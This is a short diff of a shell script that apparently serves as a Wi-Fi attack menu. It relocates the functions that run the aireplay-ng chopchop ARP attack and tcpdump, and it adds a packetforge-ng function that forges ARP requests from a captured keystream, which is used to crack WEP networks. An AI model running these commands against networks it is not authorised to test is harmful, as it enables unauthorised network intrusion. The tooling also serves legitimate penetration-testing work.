@@ -4127,25 +4127,6 @@ arAttackChopChop(){
 }
 
 
-generateArpPacket(){
-
-	currentTask="generateArpPacket"
-
-	$terminal aireplay-ng -4 $interfaceMonitor &
-	
-	# Alt
-	$terminal aireplay-ng -4 -h $macAddressMonitor $interfaceMonitor &
-
-}
-
-
-tcpDump(){
-
-	$terminal tcpdump -s 0 -n -e -r $1 &
-	
-}
-
-
 arAttackFragment(){
 
 	currentTask="arAttackFragment"
@@ -5465,6 +5446,34 @@ menuAttacksAllWifiteAuto(){
 
 	killAll
 	menuMain
+
+}
+
+
+generateArpPacket(){
+
+	currentTask="generateArpPacket"
+
+	$terminal aireplay-ng -4 $interfaceMonitor &
+	
+	# Alt
+	$terminal aireplay-ng -4 -h $macAddressMonitor $interfaceMonitor &
+
+}
+
+
+tcpDump(){
+
+	# Accepts a CAP file as an argument
+	$terminal tcpdump -s 0 -n -e -r $1 &
+	
+}
+
+
+forgeArpRequest(){
+
+	# Accepts an XOR file as an argument
+	packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w "$initPath/$bssid-arp.cap"
 
 }
 
